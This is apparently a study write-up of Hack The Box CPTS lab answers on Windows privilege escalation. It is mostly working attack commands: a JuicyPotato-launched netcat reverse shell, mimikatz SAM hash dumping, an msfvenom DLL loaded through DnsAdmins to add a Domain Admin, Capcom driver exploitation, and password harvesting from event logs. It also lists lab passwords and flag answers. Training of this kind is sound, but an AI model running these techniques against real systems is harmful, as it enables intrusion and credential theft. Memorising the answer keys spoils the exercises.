---
title: CPTS labs - 25 Windows Privilege Escalation
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 25 Windows Privilege Escalation

## Getting the Lay of the Land

**RDP to (ACADEMY-WINLPE-SRV01) with user "htb-student" and password "HTB_@cademy_stdnt!". What is the IP address of the other NIC attached to the target host?**

``` powershell
ipconfig /all
```

Results: 172.16.20.45

**What executable other than cmd.exe is blocked by AppLocker?**

We list the AppLocker Rules:

``` powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Results: powershell_ise.exe





**What non-default privilege does the htb-student user have?**

```powershell
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

Results: SeTakeOwnershipPrivilege

**Who is a member of the Backup Operators group?**

```powershell
net localgroup "Backup Operators"
```

Results: sarah


**What service is listening on port 8080 (service name not the executable)?**

```powershell
tasklist /svc
```

Results: Tomcat8


**What user is logged in to the target host?**

```powershell
query user
```

Results:  sccm_svc


**What type of session does this user have?**

```powershell
query user
```

Results:  console


**What service is listening on 0.0.0.0:21? (two words)**

```
tasklist /svc
```

Results: FileZilla Server

**Which account has WRITE_DAC privileges over the \pipe\SQLLocal\SQLEXPRESS01 named pipe?**

```
.\accesschk.exe -accepteula -w \pipe\SQLLocal\SQLEXPRESS01 -v
```

Results: NT SERVICE\MSSQL$SQLEXPRESS01


## Windows User Privileges

Authenticate to  with user "sql_dev" and password "Str0ng_P@ssw0rd!". Escalate privileges using one of the methods shown in this section. Submit the contents of the flag file located at c:\Users\Administrator\Desktop\SeImpersonate\flag.txt

```
# As I was not able to RDP using the sql_dev account. I connected with htb-student and ran cmd as sql_dev.
xfreerdp /v:10.129.43.43 /u:sql_dev /p:'Str0ng_P@ssw0rd!' /cert:ignore

# Another alternative:
mssqlclient.py sql_dev@10.129.43.43 -windows-auth
# Enter password: Str0ng_P@ssw0rd

# Enabling xp_cmdshell
enable_xp_cmdshell

# Checking Account Privileges
xp_cmdshell whoami /priv
```

As SeImpersonatePrivilege is listed, we may impersonate a privileged account such as NT AUTHORITY\SYSTEM.

To escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. But this is already saved in the C:\Tools folder. So we will jump to the next step, start a Netcat listener on port 8443 from your attacking machine:

```
nc -lnvp 8443
```

Execute the command below where -l is the COM server listening port, -p is the program to launch (cmd.exe), -a is the argument passed to cmd.exe, and -t is the createprocess call. Below, we are telling the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively.

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.49 8443 -e cmd.exe" -t *
```

Cat the flag:

```
type c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
```

Results: F3ar_th3_p0tato!

**RDP to  with user "jordan" and password "HTB_@cademy_j0rdan!". Leverage SeDebugPrivilege rights and obtain the NTLM password hash for the sccm_svc account.**

```
xfreerdp /v:10.129.43.43 /u:jordan /p:HTB_@cademy_j0rdan! /cert:ignore

. .\psgetsys.ps1 
ImpersonateFromParentPid -ppid 612 -command "c:\Windows\System32\cmd.exe" -cmdargs ""

# Now we open mimikatz (in tools)
cd c:\Tools\mimikatz
# And browse to the tool
.\mimikatz.exe

# Impersonate as NT Authority/SYSTEM (having permissions for it).
token::elevate

# List users and hashes of the machine
lsadump::sam
```

Results: 64f12cddaa88057e06a81b54e73b949b


**RDP to (ACADEMY-WINLPE-SRV01) with user "htb-student" and password "HTB_@cademy_stdnt!". Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents.**

```
xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.43.43 /cert:ignore  
# Check permissions
whoami /priv

# In the output we can see SeTakeOwnershipPrivilege is disabled. We will use the Enable-Privilege.ps1 and the EnableAllTokenPrivs.ps1 scripts to enable it.

```

See the scripts  in [windows-user-privileges](windows-user-privileges.md)

```
# Run the scripts to enable the SeTakeOwnershipPrivilege
Import-module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

And now it is enabled.

```
# Check out the target file to gather a bit more information about it.
Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

# Checking File Ownership:
cmd /c dir /q 'C:\TakeOwn\'

# Taking Ownership of the File:
takeown /f 'C:\TakeOwn\flag.txt'

# Confirm change of ownership:
Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

# We need to modify ACL to get to read the file.
icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F

# Print out the file
type 'C:\TakeOwn\flag.txt'
```

Results: 1m_th3_f1l3_0wn3r_n0W!


## Windows Group Privileges

RDP to  with user "svc_backup" and password "HTB_@cademy_stdnt!". Leverage SeBackupPrivilege rights and obtain the flag located at c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt

```
xfreerdp /v:10.129.43.42 /u:svc_backup /p:HTB_@cademy_stdnt! /cert:ignore

# Check privs and group memberships:
whoami /priv
whoami /groups

# If SeBackupPrivilege is present, double check if it is enabled:
Get-SeBackupPrivilege

# If disabled, enable it (and check it back):
Set-SeBackupPrivilege
Get-SeBackupPrivilege
whoami /priv

# Copy the file
Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt

type flag.txt
```

Results: Car3ful_w1th_gr0up_m3mberSh1p! 


**RDP to  with user "logger" and password "HTB_@cademy_stdnt!" Using the methods demonstrated in this section find the password for the user mary.**

```
xfreerdp /v:10.129.43.43 /u:logger /p:HTB_@cademy_stdnt! /cert:ignore

# Confirming Group Membership
net localgroup "Event Log Readers"

# Also
whoami /groups

# Searching Security Logs Using wevtutil (Windows Event Utility, used for querying and managing event logs):
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# qe Security → Queries the Security event log.
# /rd:true → Reads events in reverse order (starting from the most recent).
# /f:text  → Formats the output in plain text (instead of XML or JSON).
# | Select-String "/user" → Pipes (`|`) the output to `Select-String`, which **searches for lines containing** `"/user"`.
```

Results:  W1ntergreen_gum_2021!


**RDP to  with user "netadm" and password "HTB_@cademy_stdnt!". Leverage membership in the DnsAdmins group to escalate privileges. Submit the contents of the flag located at c:\Users\Administrator\Desktop\DnsAdmins\flag.txt**

```
xfreerdp /v:10.129.43.42 /u:netadm /p:HTB_@cademy_stdnt! /cert:ignore

# Go to c:\Tools and you directly will see the adduser.dll. Otherwise, to generate it:


# Generating Malicious DLL to add a user to the domain admins group using msfvenom from your attacking machine:
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# Starting Local HTTP Server: 
python3 -m http.server 7777

# Downloading File to Target machine:
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"

# Loading this DLL as a normal user isn't successful. Only members of the `DnsAdmins` group are permitted to do this. 
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

# With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.
wmic useraccount where name="netadm" get sid
sc.exe sdshow DNS


# Stopping and starting the DNS Service
sc.exe stop dns
sc.exe start dns

# Confirming Group Membership
net group "Domain Admins" /dom

# However, your session is still running at `Medium Mandatory Level`, which indicates you haven’t fully inherited the **Domain Admin** privileges yet.
logoff

# And when you connect back, you will be Domain Admin.
type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
```

Results: Dll_abus3_ftw!  

**RDP to  with user "printsvc" and password "HTB_@cademy_stdnt!". Follow the steps in this section to escalate privileges to SYSTEM, and submit the contents of the flag.txt file on administrator's Desktop. Necessary tools for both methods can be found in the C:\Tools directory, or you can practice compiling and uploading them on your own.**

```
xfreerdp /v:10.129.217.105 /u:printsvc /p:HTB_@cademy_stdnt! /cert:ignore
```

Check our group membershipts:

```powershell
whoami /groups
```

We see Print Operators, which usually has the SeLoadDriverPrivilege. However when we check our permissions is not listed:

```powershell
whoami /priv
```


If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC. 
	- You can bypass it with  [UACMe](https://github.com/hfiref0x/UACME) repo features or any similar code approach.
	- You can also bypass it from user interface. Open a powershell with administrator permissions. 	

 If disabled, enabled SeLoadDriverPrivilege. Now, next troubleshooting is that the `SeLoadDriverPrivilege` may be Disabled. To enable it, we will need the following:

- The executable `EnableSeLoadDriverPrivilege.exe` that we can compile using the forked repo [https://github.com/amandaguglieri/enabling-privileges](https://github.com/amandaguglieri/enabling-privileges).  
- The file Capcom.sys. I've forked it to [https://github.com/amandaguglieri/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/amandaguglieri/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- The DriverView.exe utility, officially available at [https://www.nirsoft.net/utils/driverview.html](https://www.nirsoft.net/utils/driverview.html) and in my case, also uploaded to [my repo](https://github.com/amandaguglieri/hackinglife/blob/main/docs/files/DriverView.exe).

Compiling `EnableSeLoadDriverPrivilege.exe` . I've set up Visual Studio 2022 in a Windows Virtual Machine. 


```
# Clone my forked repo
https://github.com/amandaguglieri/enabling-privileges

# Add the following libraries to the EnableSeLoadDriverPrivilege.cpp file
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#pragma comment(lib,"advapi32.lib") 
#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"Ntdll.lib")
#include <stdio.h>
#include "tchar.h"

# Now, from the terminal (CTRL+ñ), compile:
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
# This will generate the required EnableSeLoadDriverPrivilege.exe. Save it to the folder from where you want to serve the payload to the target host.
```

Download the other required files (`Capcom.sys`  and `DriverView.exe`) to the folder from where you want to serve the payload to the target host.

```
# Download Capcom.sys
wget https://github.com/amandaguglieri/enabling-privileges/blob/master/Capcom.sys

# Download DriverView.exe
wget https://github.com/amandaguglieri/hackinglife/blob/main/docs/files/DriverView.exe
```

Serve the files to the target host:

```
python3 -m http.server 80
```

Download the files to the target host:


```powershell
# open a powershell terminal and change the directory for instance to C:\Tools
cd C:\Tools
wget http://10.10.14.39/EnableSeLoadDriverPrivilege.exe -outfile EnableSeLoadDriverPrivilege.exe
wget http://10.10.14.39/Capcom.sys -outfile Capcom.sys
wget http://10.10.14.39/DriverView.exe -outfile DriverView.exe
```

Save the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\test`. If test does not exist, create it:

```powershell
mkdir c:\test
copy Capcom.sys c:\test\Capcom.sys
```

Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.

```powershell
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

Run the `EnableSeLoadDriverPrivilege.exe` binary.

```powershell
.\EnableSeLoadDriverPrivilege.exe
```

The Output should be something like this:

```powershell
whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
```

Next, verify that the Capcom driver is now listed.

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

The output should be something like this:

```
Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

Now we will use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool for escalating privileges. I've cloned it into a windows virtual machine with Visual Studio 2022 installed (in my kali machine)

- Open Visual Studio 2022. Clone the project. Once cloned, right click and select "Compile". It's important to change the architecture to x64 in order to compile.
- Executable generated under "C:\Users\vboxuser\source\repos\ExploitCapcom\ExploitCapcom\x64\Release"

Upload the `ExploitCapcom.exe` file to the target machine:

```
# from the attacking machine
python3 -m http.server 80

# from the target host
wget http://$attackingIP/ExploitCapcom.exe -outfile ExploitCapcom.exe
```

Run the binary:

```powershell
.\ExploitCapcom.exe
```

This launches a shell with SYSTEM privileges. Now we print the flag.txt:

```
type c:\Users\Administrator\Desktop
```

If for some reason you can not read it, copy the file in order to read it.

Results:  Pr1nt_0p3rat0rs_ftw!


